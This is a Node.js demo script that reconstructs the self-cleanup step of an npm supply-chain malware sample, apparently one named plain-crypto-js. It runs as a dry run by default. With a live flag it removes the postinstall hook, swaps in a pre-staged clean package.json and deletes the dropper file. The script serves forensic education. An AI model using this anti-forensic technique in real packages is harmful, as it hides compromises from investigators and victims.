/**
 * cleanup/cleanup.js
 *
 * DEMO RECONSTRUCTION — Forensic self-cleanup simulation
 *
 * Demonstrates the three-step cleanup the real malware performed
 * after dropping the RAT to evade post-infection forensic analysis:
 *
 *   Step 1 — Remove the postinstall hook from the installed package.json
 *   Step 2 — Replace package.json with the clean version (package.md)
 *   Step 3 — Delete setup.js (the dropper) from disk
 *
 * The net result: anyone inspecting node_modules/plain-crypto-js after
 * the fact would find a perfectly clean package with no trace of malice.
 *
 * Run: node cleanup/cleanup.js [--live]
 *   Default: DRY RUN (logs actions only)
 *   --live:  actually performs the file operations (use in a VM)
 */

"use strict";

const fs = require("fs");
const path = require("path");

const LIVE = process.argv.includes("--live");
const PKG_DIR = path.join(__dirname, "..", "plain-crypto-js");

function log(msg) {
  console.log(`[cleanup] ${msg}`);
}

function dryOrRun(description, fn) {
  if (LIVE) {
    log(`EXECUTING: ${description}`);
    fn();
    log(`  Done`);
  } else {
    log(`[DRY RUN] Would execute: ${description}`);
  }
}

// ─── STEP 1: Show before-state ────────────────────────────────────────────────

log("=".repeat(60));
log("Forensic Cleanup Demo");
log("=".repeat(60));

const pkgJsonPath = path.join(PKG_DIR, "package.json");
const pkgMdPath = path.join(PKG_DIR, "package.md");
const setupPath = path.join(PKG_DIR, "setup.js");

log("\n[BEFORE] Current state of plain-crypto-js/");
log(`  package.json exists: ${fs.existsSync(pkgJsonPath)}`);
log(`  package.md exists:   ${fs.existsSync(pkgMdPath)}`);
log(`  setup.js exists:     ${fs.existsSync(setupPath)}`);

if (fs.existsSync(pkgJsonPath)) {
  const current = JSON.parse(fs.readFileSync(pkgJsonPath, "utf8"));
  log(`\n[BEFORE] package.json contents:`);
  log(JSON.stringify(current, null, 2));
  if (current.scripts?.postinstall) {
    log(`\n  WARNING: Malicious postinstall hook detected: "${current.scripts.postinstall}"`);
  }
}

// ─── STEP 2: Perform cleanup ─────────────────────────────────────────────────

log("\n" + "─".repeat(60));
log("Performing cleanup steps...");
log("─".repeat(60) + "\n");

// Step 1: Remove postinstall from package.json in memory
dryOrRun("Remove postinstall hook from package.json", () => {
  const pkg = JSON.parse(fs.readFileSync(pkgJsonPath, "utf8"));
  delete pkg.scripts;
  fs.writeFileSync(pkgJsonPath, JSON.stringify(pkg, null, 2));
});

// Step 2: Replace package.json with clean package.md
dryOrRun(`Replace package.json with clean manifest from package.md`, () => {
  const cleanManifest = fs.readFileSync(pkgMdPath, "utf8");
  fs.writeFileSync(pkgJsonPath, cleanManifest);
});

// Step 3: Delete setup.js
dryOrRun(`Delete dropper setup.js from disk`, () => {
  // Rename first to avoid EBUSY on Windows
  const dead = setupPath + ".dead";
  fs.renameSync(setupPath, dead);
  fs.unlinkSync(dead);
});

// ─── STEP 3: Show after-state ─────────────────────────────────────────────────

log("\n" + "─".repeat(60));
log("[AFTER] What a forensic investigator would find:");
log("─".repeat(60) + "\n");

if (LIVE) {
  log(`  package.json exists: ${fs.existsSync(pkgJsonPath)}`);
  log(`  setup.js exists:     ${fs.existsSync(setupPath)}`);
  if (fs.existsSync(pkgJsonPath)) {
    const after = JSON.parse(fs.readFileSync(pkgJsonPath, "utf8"));
    log(`\n  package.json contents (clean):`);
    log(JSON.stringify(after, null, 2));
    log(`\n  postinstall hook present: ${!!after.scripts?.postinstall}`);
  }
} else {
  log("  [DRY RUN] package.json — would contain clean manifest, no scripts block");
  log("  [DRY RUN] setup.js — would not exist on disk");
  log("  [DRY RUN] package.md — would still exist (it was the source of the clean manifest)");
  log("\n  Result: package looks completely legitimate. No postinstall hook. No dropper.");
  log("  Traditional diff-based code review would find nothing suspicious.");
}

log("\n" + "=".repeat(60));
log("Key insight: the malware swapped package.json BEFORE an investigator");
log("could inspect node_modules. package.md — the clean manifest — was");
log("pre-staged inside the malicious package specifically for this swap.");
log("=".repeat(60));
